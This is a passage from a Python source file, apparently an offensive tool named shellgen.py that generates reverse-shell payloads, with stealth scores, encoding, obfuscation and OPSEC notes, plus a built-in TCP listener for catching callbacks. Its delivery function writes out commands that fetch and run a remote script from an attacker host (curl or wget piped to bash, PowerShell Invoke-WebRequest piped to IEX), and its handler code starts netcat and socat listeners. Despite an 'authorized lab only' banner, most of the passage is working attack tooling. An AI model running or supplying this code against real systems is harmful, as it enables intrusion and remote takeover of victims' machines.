                    f"socat openssl-listen:{self._lport},cert=/tmp/srv.pem,verify=0 "
                    f"file:`tty`,raw,echo=0")
        if t.language in ("powershell",) or t.platform == "windows":
            return f"nc -lvnp {self._lport}   # or: python3 shellgen.py --listen {self._lport}"
        return f"nc -lvnp {self._lport}"

    def _delivery_cmd(self, t: PayloadTemplate) -> str:
        """
        Generate the target-side command that triggers payload execution.

        Args:
            t : PayloadTemplate to generate the delivery command for

        Returns:
            Delivery command string to run on the target.
        """
        if "curl" in t.name:
            return f"curl -fsSL http://{self._lhost}:{self._lport + 1}/shell.sh | bash"
        if "wget" in t.name:
            return f"wget -qO- http://{self._lhost}:{self._lport + 1}/shell.sh | bash"
        if t.platform == "windows":
            return f"(Invoke-WebRequest -Uri http://{self._lhost}:{self._lport + 1}/shell.ps1).Content | IEX"
        return f"curl http://{self._lhost}:{self._lport + 1}/shell.sh | bash"


# ─────────────────────────────────────────────────────────────────────────────
# Raw TCP listener (--listen mode)
# ─────────────────────────────────────────────────────────────────────────────

class RawListener:
    """
    A minimal TCP listener that bridges stdin/stdout to an incoming connection.

    Used with --listen to test payloads without installing netcat.
    Not as capable as a full handler (no PTY, no persistence) but good
    enough to verify the payload connects back correctly.

    Args:
        lhost : IP to bind to ('' = all interfaces)
        lport : TCP port to listen on
    """

    def __init__(self, lhost: str, lport: int) -> None:
        """
        Initialise the listener.

        Args:
            lhost : Bind address
            lport : Bind port
        """
        self._lhost = lhost if lhost != "0.0.0.0" else ""
        self._lport = lport

    def listen(self) -> None:
        """
        Bind, accept one connection, and bridge it to stdin/stdout.

        Data received from the remote shell is printed to stdout.
        Lines typed on stdin are sent to the remote shell.
        Runs until the remote side disconnects or CTRL+C is pressed.
        """
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self._lhost, self._lport))
        srv.listen(1)

        print(cyan(f"\n  [*] Listening on {self._lhost or '0.0.0.0'}:{self._lport} ..."))
        conn, addr = srv.accept()
        print(green(f"  [+] Connection from {addr[0]}:{addr[1]}\n"))
        srv.close()

        stop_event = threading.Event()

        def _recv() -> None:
            """Receive loop: read from socket, write to stdout."""
            while not stop_event.is_set():
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                except (OSError, UnicodeDecodeError):
                    break
            stop_event.set()

        recv_thread = threading.Thread(target=_recv, daemon=True)
        recv_thread.start()

        try:
            while not stop_event.is_set():
                line = input()
                conn.sendall((line + "\n").encode())
        except (KeyboardInterrupt, EOFError):
            pass
        finally:
            stop_event.set()
            conn.close()
            print(yellow("\n  [*] Connection closed."))


# ─────────────────────────────────────────────────────────────────────────────
# Output renderers
# ─────────────────────────────────────────────────────────────────────────────

def _stealth_bar(score: int) -> str:
    """
    Render a stealth score as a colored progress bar.

    Args:
        score : Integer 1-10 stealth score

    Returns:
        Colored bar string like '███████░░░ 7/10'
    """
    filled = "█" * score
    empty  = "░" * (10 - score)
    color  = green if score >= 7 else yellow if score >= 4 else red
    return color(f"{filled}{empty}") + grey(f" {score}/10")


def print_table(templates: list[PayloadTemplate]) -> None:
    """
    Print a summary table of available payload templates.

    Args:
        templates : List of PayloadTemplate objects to display
    """
    print()
    print(bold(f"  {'NAME':<22} {'LANG':<12} {'PLATFORM':<10} {'STEALTH':<22} {'DESCRIPTION'}"))
    print(f"  {'─'*21} {'─'*11} {'─'*9} {'─'*21} {'─'*40}")
    for t in templates:
        name_str = cyan(f"{t.name:<22}")
        lang_str = f"{t.language:<12}"
        plat_str = grey(f"{t.platform:<10}")
        bar_str  = _stealth_bar(t.stealth_score)
        desc_str = t.description[:55]
        print(f"  {name_str} {lang_str} {plat_str} {bar_str}  {desc_str}")
    print()


def print_single(rendered: RenderedPayload, show_opsec: bool = True) -> None:
    """
    Print a single rendered payload with its OPSEC notes.

    Args:
        rendered   : RenderedPayload to display
        show_opsec : Include OPSEC analysis notes if True
    """
    t = rendered.template
    print()
    print(bold(cyan(f"  ╔══ {t.name.upper()} — {t.description} {'═' * max(0, 45 - len(t.name) - len(t.description))}")))
    print(f"  ║  Language  : {t.language}")
    print(f"  ║  Platform  : {t.platform}")
    print(f"  ║  Encoding  : {rendered.encoding}")
    print(f"  ║  Obfuscated: {'yes' if rendered.obfuscated else 'no'}")
    print(f"  ║  Stealth   : {_stealth_bar(t.stealth_score)}")
    print(f"  ║  Root req  : {'yes' if t.requires_root else 'no'}")
    print(bold(cyan("  ╠══ PAYLOAD")))
    print(f"\n  {green(rendered.command)}\n")
    if show_opsec:
        print(bold(cyan("  ╠══ OPSEC NOTES")))
        for note in t.opsec_notes:
            print(f"  ║  {yellow('▸')} {note}")
    print(bold(cyan(f"  ╚{'═' * 60}")))
    print()


def print_cheatsheet(engine: PayloadEngine, templates: list[PayloadTemplate]) -> None:
    """
    Print all payloads for the configured LHOST:LPORT as a compact cheat sheet.

    Args:
        engine    : PayloadEngine with lhost/lport set
        templates : List of templates to include in the cheat sheet
    """
    print()
    print(bold(cyan(f"  CHEAT SHEET — LHOST={engine.lhost}  LPORT={engine.lport}")))
    print(cyan(f"  {'─' * 70}"))
    for t in templates:
        try:
            rendered = engine.render(t, encoding="plain")
            print(f"\n  {bold(t.name):<30} {grey('[' + t.language + ']')}")
            print(f"  {rendered.command}")
        except ValueError:
            continue
    print()


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    """
    Build and return the CLI argument parser.

    Returns:
        Configured ArgumentParser instance
    """
    p = argparse.ArgumentParser(
        prog="shellgen.py",
        description=(
            "Advanced shell payload generator with encoding, obfuscation,\n"
            "OPSEC analysis, and full deployment planning.\n"
            "Authorized lab / CTF / penetration testing environments only.\n\n"
            "Examples:\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate --plan\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --cheatsheet\n"
            "  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux\n"
            "  python3 shellgen.py --listen 4444"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--lhost", default="192.168.100.10",
                   help="Listener/attacker IP (default: 192.168.100.10)")
    p.add_argument("--lport", type=int, default=4444,
                   help="Listener port (default: 4444)")
    p.add_argument("--name", metavar="PAYLOAD",
                   help="Specific payload name to render (see table for names)")
    p.add_argument("--encode", choices=["plain", "b64", "url", "ps_enc"], default="plain",
                   help="Encoding mode (default: plain)")
    p.add_argument("--obfuscate", action="store_true",
                   help="Apply variable-name / string-split obfuscation")
    p.add_argument("--plan", action="store_true",
                   help="Print full deployment plan (listener + hosting + delivery + PTY)")
    p.add_argument("--cheatsheet", action="store_true",
                   help="Print all payloads for the given LHOST:LPORT")
    p.add_argument("--platform", choices=["linux", "windows", "any"],
                   help="Filter by target platform")
    p.add_argument("--language", metavar="LANG",
                   help="Filter by language (bash, python3, php, powershell, ...)")
    p.add_argument("--min-stealth", type=int, default=1, metavar="N",
                   help="Only show payloads with stealth score >= N (1-10)")
    p.add_argument("--listen", type=int, metavar="PORT",
                   help="Start a raw TCP listener on PORT to catch callbacks")
    p.add_argument("--list", action="store_true",
                   help="Print the full payload table and exit")
    return p


def main() -> None:
    """
    Parse CLI arguments and execute the requested action.

    Actions (in priority order):
        --listen    → Start TCP listener and exit
        --list      → Print full payload table and exit
        --cheatsheet → Print all payloads and exit
        --name      → Render one specific payload (+ optional plan)
        (default)   → Print filtered table
    """
    parser = build_parser()
    args   = parser.parse_args()

    # ── --listen mode: start raw listener ───────────────────────────────────
    if args.listen:
        listener = RawListener(args.lhost, args.listen)
        listener.listen()
        return

    engine  = PayloadEngine(lhost=args.lhost, lport=args.lport)
    planner = DeploymentPlanner(engine)

    # Apply filters to the template database
    templates = PAYLOAD_DB
    if args.platform:
        templates = [t for t in templates if t.platform in (args.platform, "any")]
    if args.language:
        templates = [t for t in templates if t.language == args.language]
    if args.min_stealth > 1:
        templates = [t for t in templates if t.stealth_score >= args.min_stealth]

    # ── --list: show full table and exit ────────────────────────────────────
    if args.list:
        print_table(templates)
        return

    # ── --cheatsheet: all payloads in compact format ─────────────────────────
    if args.cheatsheet:
        print_cheatsheet(engine, templates)
        return

    # ── --name: render a specific payload ────────────────────────────────────
    if args.name:
        template = _TEMPLATE_MAP.get(args.name)
        if not template:
            names = ", ".join(sorted(_TEMPLATE_MAP.keys()))
            print(red(f"[!] Unknown payload '{args.name}'. Available: {names}"))
            sys.exit(1)
        try:
            rendered = engine.render(template, encoding=args.encode, obfuscate=args.obfuscate)
        except ValueError as e:
            print(red(f"[!] {e}"))
            sys.exit(1)

        print_single(rendered, show_opsec=True)

        if args.plan:
            print(planner.plan(rendered))
        return

    # ── Default: show filtered table ─────────────────────────────────────────
    print(bold(cyan(f"\n  shellgen.py  |  lhost={args.lhost}  lport={args.lport}")))
    print(grey("  Authorized lab / CTF / penetration testing environments only.\n"))
    print_table(templates)
    print(grey(
        "  Use --name <name> to render a payload.  "
        "  --encode b64  --obfuscate  --plan  --cheatsheet"
    ))


if __name__ == "__main__":
    main()
